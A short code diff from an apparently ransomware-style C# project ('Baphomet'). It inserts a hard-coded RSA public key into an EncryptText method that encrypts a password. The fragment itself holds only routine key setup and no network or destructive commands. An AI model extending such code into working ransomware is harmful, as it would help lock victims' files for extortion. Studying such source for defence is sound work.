@@ -11,7 +11,7 @@ namespace Baphomet.Utilities
         public  void EncryptText(string targetPath ,string password)
         {
             //Pega tu llave publica aqui! / Paste your public key here!
-            string publicKey = "<public key here>";
+            string publicKey = "<RSAKeyValue><Modulus>0UqS4uAaL0NtR5Cnz2T98xx4iKvnwVApcrzE87fm32RotOouRcpAS/leozCMokOfBK62mtaDxLhjn4u64OfbRywZOb7U3KOJwUSpDEJUn6v53/GeaVBr27k4mjO4WKWWKXIDLR9ySvQEA+WHUjbQj/qRhbmosIefzrmUaZfFnjE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
             // Convierto el password a un array byte 
             UnicodeEncoding byteConverter = new UnicodeEncoding();
             byte[] dataToEncrypt = byteConverter.GetBytes(password);
